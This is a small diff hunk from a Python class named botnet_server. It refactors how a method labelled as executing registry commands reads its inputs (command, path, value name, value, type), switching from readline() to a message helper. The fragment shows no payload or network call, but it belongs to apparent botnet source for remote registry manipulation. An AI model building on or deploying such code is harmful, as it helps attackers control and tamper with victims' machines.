@@ -225,11 +225,11 @@ class botnet_server:
            
     # execute registry command from client
     def exec_reg_cmd(self):
-        cmd = self.nr.readline().strip()
-        path = self.nr.readline().strip()
-        val_name = self.nr.readline().strip()
-        val = self.nr.readline().strip()
-        val_type = self.nr.readline().strip()
+        cmd = self.__get_msg()
+        path = self.__get_msg()
+        val_name = self.__get_msg()
+        val = self.__get_msg()
+        val_type = self.__get_msg()
         print(cmd, path, val_name, val_type, val)
         key = registry(path)
         if (cmd == "GETVAL"):
